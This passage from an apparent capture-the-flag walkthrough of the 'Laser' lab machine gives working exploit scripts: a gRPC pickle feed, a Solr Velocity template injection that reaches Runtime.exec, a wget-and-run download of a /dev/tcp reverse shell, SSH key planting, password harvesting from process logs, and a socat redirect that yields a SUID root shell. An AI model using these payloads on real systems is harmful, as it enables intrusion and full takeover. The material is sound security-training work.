    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}
'''

host = "10.10.14.9"
host = "localhost"
target = f"gopher://{host}:8983/_"
http1 = target + quote(post, safe='')

channel = grpc.insecure_channel('10.10.10.201:9000')
stub = feedengine_pb2_grpc.PrintStub(channel)
payload_ser = base64.b64encode(pickle.dumps(grpc_payload.format(url=http1)))
content = feedengine_pb2.Content(data=payload_ser)
response = stub.Feed(content)
print(response)

```

And:

```

import pickle
import sys
import feedengine_pb2
import feedengine_pb2_grpc
from urllib.parse import quote

grpc_payload = """{{
    "version": "v1.0",
    "title": "Printer Feed",
    "home_page_url": "",
    "feed_url": "{url}",
    "items": [
        {{
            "id": "2",
            "content_text": "Queue jobs"
        }},
        {{
            "id": "1",
            "content_text": "Failed items"
        }}
    ]
}}"""

host = "10.10.14.9"
host = "localhost"
fn = '/tmp/0xdf.sh'
cmds = [f'wget http://10.10.14.9/shell.sh -O {fn}',
        f'chmod +x {fn}',
        f'{fn}']

channel = grpc.insecure_channel('10.10.10.201:9000')
stub = feedengine_pb2_grpc.PrintStub(channel)

for cmd in cmds:
    http2 = f"http://{host}:8983/solr/staging/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+        %23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27{quote(cmd)}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
    payload_ser = base64.b64encode(pickle.dumps(grpc_payload.format(url=http2)))
    content = feedengine_pb2.Content(data=payload_ser)
    response = stub.Feed(content)
    print(response)

```

I can start both a `nc` listener on 443 and a Python webserver on 80 serving my `shell.sh`:

```

#!/bin/bash

bash -i >& /dev/tcp/10.10.14.9/443 0>&1

```

Then I run the first, and it hangs:

```

root@kali# python3 feedengine_pwn1.py 

```

While it hangs, I run the second one, and it hangs after the second print:

```

root@kali# python3 feedengine_pwn2-better.py 
feed: "Pushing feeds"

feed: "Pushing feeds"

```

On the first print, I see a hit on the webserver:

```
10.10.10.201 - - [13/Sep/2020 07:03:00] "GET /shell.sh HTTP/1.1" 200 -

```

And then before the third print, I get a shell:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.201.
Ncat: Connection from 10.10.10.201:48190.
bash: cannot set terminal process group (1099): Inappropriate ioctl for device
bash: no job control in this shell
solr@laser:/opt/solr/server$ 

```

I can now grab `user.txt`:

```

solr@laser:/home/solr$ cat user.txt
77d392f1************************

```

#### Upgrade

To get a better shell, I wrote my SSH key into `/var/solr/.ssh/authorized_keys`:

```

solr@laser:~$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" >> /var/solr/.ssh/authorized_keys

```

And then connected over SSH:

```

root@kali# ssh -i ~/keys/ed25519_gen solr@10.10.10.201
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 13 Sep 2020 03:43:15 PM UTC

  System load:                      0.03
  Usage of /:                       42.3% of 19.56GB
  Memory usage:                     57%
  Swap usage:                       0%
  Processes:                        233
  Users logged in:                  0
  IPv4 address for br-3ae8661b394c: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.10.10.201
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:563c
 * Are you ready for Kubernetes 1.19? It's nearly here! Try RC3 with
   sudo snap install microk8s --channel=1.19/candidate --classic

   https://www.microk8s.io/ has docs and details.

73 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Last login: Tue Aug  4 07:01:35 2020 from 10.10.14.9
solr@laser:~$ 

```

## Shell as root

### Enumeration

I didn’t find much of interest looking around the box, and eventually I uploaded [pspy](https://github.com/DominicBreuker/pspy). There’s a bunch of stuff running regularly. Immediately I noticed a bunch of activity using `sshpass`. This is a utility that I use all the time that allows you to give a password on the command line for `ssh` and `scp`, thus making them scriptable. This is generally consider insecure and thus bad practice. I do it all the time for HTB machines to both show the password in the post and have a copy-able one line connection when I come back way later.

Most of the time, the box is SCPing files into the container at 172.18.0.2. There is one group of commands that involves execution of a script:

```

2020/09/13 11:27:01 CMD: UID=0    PID=54532  | sshpass -p zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz scp /root/clear.sh root@172.18.0.2:/tmp/clear.sh
2020/09/13 11:27:01 CMD: UID=0    PID=54552  | sshpass -p zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz ssh root@172.18.0.2 /tmp/clear.sh                                                                                 
2020/09/13 11:27:01 CMD: UID=0    PID=54571  | sshpass -p zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz ssh root@172.18.0.2 rm /tmp/clear.sh

```

For some reason, the password is masked most of the time and replaced with all `z`. But if I let it run for a while, once in a while it isn’t masked:

```

2020/09/13 11:24:45 CMD: UID=0    PID=52688  | sshpass -p c413d115b3d87664499624e7826d8c5a scp /opt/updates/files/apiv2-feed root@172.18.0.2:/root/feeds/

```

I can verify that this password does work to get a root shell in the container:

```

solr@laser:~$ sshpass -p c413d115b3d87664499624e7826d8c5a ssh root@172.18.0.2
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sun Sep 13 16:09:52 2020 from 172.18.0.1
root@20e3289bc183:~# id && hostname
uid=0(root) gid=0(root) groups=0(root)
20e3289bc183

```

But there’s nothing interesting in there.

### SSH Auth Background

On important thing to know about SSH is how it tries to connect. When you connect, it asks the server for the kinds of auth accepted, and then tried those in order. Typically that is keys, then password. When I run SSH within `sshpass`, it still checks this order. For example, I’ll try to connect to root@laser with a password that I know won’t work:

```

root@kali# sshpass -p 0xdf ssh -v root@10.10.10.201
OpenSSH_8.3p1 Debian-1, OpenSSL 1.1.1g  21 Apr 2020
debug1: Reading configuration data /root/.ssh/config
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf matched no files
debug1: /etc/ssh/ssh_config line 21: Applying options for *
debug1: Connecting to 10.10.10.201 [10.10.10.201] port 22.
...[snip]...
debug1: rekey in after 134217728 blocks
debug1: Will attempt key: /root/.ssh/id_rsa 
debug1: Will attempt key: /root/.ssh/id_dsa 
debug1: Will attempt key: /root/.ssh/id_ecdsa 
debug1: Will attempt key: /root/.ssh/id_ecdsa_sk 
debug1: Will attempt key: /root/.ssh/id_ed25519 ED25519 SHA256:5v6bCtr80KzBSQxpvM12qHOepUaHAmASha2HaGZUeXk
debug1: Will attempt key: /root/.ssh/id_ed25519_sk 
debug1: Will attempt key: /root/.ssh/id_xmss 
debug1: SSH2_MSG_EXT_INFO received
debug1: kex_input_ext_info: server-sig-algs=<ssh-ed25519,sk-ssh-ed25519@openssh.com,ssh-rsa,rsa-sha2-256,rsa-sha2-512,ssh-dss,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,sk-ecdsa-sha2-nistp256@openssh.com>
debug1: SSH2_MSG_SERVICE_ACCEPT received
debug1: Authentications that can continue: publickey,password
debug1: Next authentication method: publickey
debug1: Trying private key: /root/.ssh/id_rsa
debug1: Trying private key: /root/.ssh/id_dsa
debug1: Trying private key: /root/.ssh/id_ecdsa
debug1: Trying private key: /root/.ssh/id_ecdsa_sk
debug1: Offering public key: /root/.ssh/id_ed25519 ED25519 SHA256:5v6bCtr80KzBSQxpvM12qHOepUaHAmASha2HaGZUeXk
debug1: Authentications that can continue: publickey,password
debug1: Trying private key: /root/.ssh/id_ed25519_sk
debug1: Trying private key: /root/.ssh/id_xmss
debug1: Next authentication method: password
debug1: Authentications that can continue: publickey,password
Permission denied, please try again.

```

Only after it tried to look for every key it could in `~/.ssh` did it then try the password and fail. This is important for the next step.

### Exploit

#### Strategy

Periodically, root on Laser is connecting to 172.18.0.2, copying a script into `/tmp`, running it, and then removing it. I’m going to guess that perhaps there’s a private SSH key in root’s `.ssh` directory on Laser, and that the matching public key is in the `authorized_keys` file.

I’ll SSH to the container and kill `sshd`, and start `socat` so that it’s listening on 22 and redirecting all traffic back to the host (172.18.0.1) on port 22. That password won’t be valid, but if the private key is there and works, it will connect with that first, and work. That means it will then copy `/root/clear.sh` into `/tmp` on Laser (not the container), run it on Laser, and delete it. If that works, I just need to find a way to control the contents of `/tmp/clear.sh` to get a shell.

There’s one more issue here - host key checking. Whenever you connect to a host for the first time, by default, `ssh` will prompt you to save the hostkey. Then, if you ever connect to the same IP and that host key isn’t the same, it will fail and give you a message on how to clean it if you are sure it’s still ok. That is all to say, this connection will fail, unless that setting is explicitly disabled, like it is on Laser:

```

solr@laser:/etc/ssh$ cat ssh_config | grep -vE "^#" | grep .
Include /etc/ssh/ssh_config.d/*.conf
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
StrictHostKeyChecking no

```

The last line in the config sets `StrictHostKeyChecking` to `no`, which disables this check, and is a big hint that this attack could work.

#### Redirect 22

I’ll use Python HTTP Server to host [static socat](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat) and upload it to Laser:

```

solr@laser:/tmp$ wget 10.10.14.9/socat
--2020-09-13 16:34:26--  http://10.10.14.9/socat
Connecting to 10.10.14.9:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 375176 (366K) [application/octet-stream]
Saving to: ‘socat’

socat                                                        100%[==================================================>] 366.38K  --.-KB/s    in 0.08s   

2020-09-13 16:34:27 (4.54 MB/s) - ‘socat’ saved [375176/375176]

```

It turns out the container is being reset to a clean start every couple minutes. So I did the next part in a single line so I could easily recover when it does:

```

solr@laser:/tmp$ sshpass -p c413d115b3d87664499624e7826d8c5a scp socat root@172.18.0.2:/tmp/socat; sshpass -p c413d115b3d87664499624e7826d8c5a ssh root@172.18.0.2 'chmod +x /tmp/socat; service ssh stop; /tmp/socat tcp-listen:22,reuseaddr,fork tcp:172.18.0.1:22'
 * Stopping OpenBSD Secure Shell server sshd
   ...done.

```

That breaks into a few commands:
- copies socat to the container using `scp`
- connects via `ssh` and runs:
  - `chmod +x /tmp/socat` - make `socat` executable
  - `service stop ssh` - stop the SSH server listening on 22
  - `/tmp/socat tcp-listen:22,reuseaddr,fork tcp:172.18.0.1:22` - start tunnel back to host

If I touch `/tmp/clear.sh`, and then wait for the minute to roll over, it will be gone.

#### Overwrite clear.sh - Fail

My first attempt was to watch for the existence of `clear.sh` and then change it. This loop will do that:

```

solr@laser:/tmp$ while [ ! -f /tmp/clear.sh ]; do echo -en "\r$(date)"; done; ls -l clear.sh; echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > clear.sh
Sun 13 Sep 2020 05:12:03 PM UTC-rwxr-xr-x 1 root root 59 Sep 13 17:12 clear.sh
-bash: clear.sh: Permission denied

```

Unfortunately, I can see that the file, when it exists, is owned by root and not writable, so when I try to write to it, I get an error.

#### Write First

I’ll write what I want to do into `/tmp/clear.sh`, and then I set it not writable. When the script tries to `scp` into that file, it will fail. However, the default behavior of a `bash` script is to continue on the next line after a failure (you can use the `set -e` command to [change that](https://intoli.com/blog/exit-on-errors-in-bash-scripts/)). When the script continues, it will log in with `ssh` (through the container back into itself) and run my script.

First create it the script:

```

solr@laser:/tmp$ echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > clear.sh

```

This script will copy `bash` into `/tmp` as `0xdf`, make it owned by root and SUID.

Make it executable and not writable:

```

solr@laser:/tmp$ chmod +x clear.sh
solr@laser:/tmp$ chmod -w clear.sh
solr@laser:/tmp$ ls -l clear.sh
-r-xr-xr-x 1 solr solr 83 Sep 13 17:14 clear.sh

```

When the minute passes, `0xdf` is there:

```

solr@laser:/tmp$ ls -l 0xdf
-rwsrwxrwx 1 root root 1183448 Sep 13 17:16 0xdf

```

Running it gives a shell as root:

```

solr@laser:/tmp$ ./0xdf -p
0xdf-5.0# id
uid=114(solr) gid=120(solr) euid=0(root) groups=120(solr)

```

I can grab `root.txt`:

```

0xdf-5.0# cat /root/root.txt
a4a0a162************************

```

I can also grab the root `id_rsa` and use it over SSH for future root shell.